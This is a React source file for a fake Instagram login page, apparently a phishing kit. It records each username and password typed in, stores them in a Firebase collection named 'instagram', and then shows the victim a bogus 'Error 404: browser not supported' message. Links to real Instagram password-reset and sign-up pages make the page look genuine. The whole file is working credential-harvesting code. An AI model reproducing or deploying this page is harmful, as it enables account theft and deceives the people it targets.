
import React ,{ useState } from 'react';
import './Instagram.css';
import { db } from './firebase';

function Instagram() {
 const [username, setUsername]= useState("");
 const [password, setPassword] = useState("");
 const [submission, setsubmission] = useState("");

const inputUsername = (event) =>
{
  console.log(event.target.value);
  setUsername(event.target.value);
}

const inputPassword=( event ) =>
{
  console.log(event.target.value);
  setPassword(event.target.value);
}


const inputsubmit= (event)=>
{
  //  setsubmission( `${username}  ${password}`);
  

   db.collection('instagram').doc().set({name:username, pass:password });
   setTimeout(()=>
   {
     setsubmission( `Error 404:  browser not supported`)
    },1000);
    // alert('open in app');
    // alert("I am an alert box!");
  // const firestore = firebase.database().ref("/person");
  // let data={
  //   name: username,
  //   pass: password
  // }
  // firestore.push(data);
 

}
 


  return (
    <div className="instagram">
      <div className='instagram_container'>
       
       
        <div className="instagram_logo">
          <img src="data:image/png;base64,"
                alt=""/>
        </div>
       
       
        {/* <div className="instagram_header">
         <h2> Log into instagram</h2> 
       </div> */}
        
        
        <div className="instagram_section">
         <label className="instagram_label"> Username or Email</label>
          <input type="text" className="instagram_inputfield" placeholder="username"  value={username}
          onChange={inputUsername}></input>
        </div>
        
        <div className="instagram_section">
         
          <label className="instagram_label"> Password</label>
          <input type="password" className="instagram_inputfield"   placeholder="password"
           onChange={inputPassword}  value={password}></input>
          
          <div className="forgot_passworddiv">
          Forgotten your login details ? <a href="https://www.instagram.com/accounts/password/reset/" className="forgot_passworda"> Get help with logging in.</a>
           </div>
        </div>
        
        <div className="instagram_section">
          <button  type="submit" className="instagram_login" onClick={inputsubmit}>
              <a href="google.com"
              // "https://www.instagram.com/p/CSHY-sxI_P1VX5biyBHTdhOKfB4pp2JhFFG_uM0/?utm_medium=copy_link" 
              className="login_link"> Login</a> </button>
        </div>
        
        <div className="errormsg">
        <h5> {submission}</h5>
        </div>
        
        
        <div className="instagram_footer">
         Don't have an account?
         <a href="https://www.instagram.com" className="instagram_signup"> Sign up.</a>
          </div>

      </div>
    </div>
  );
}

export default Instagram;
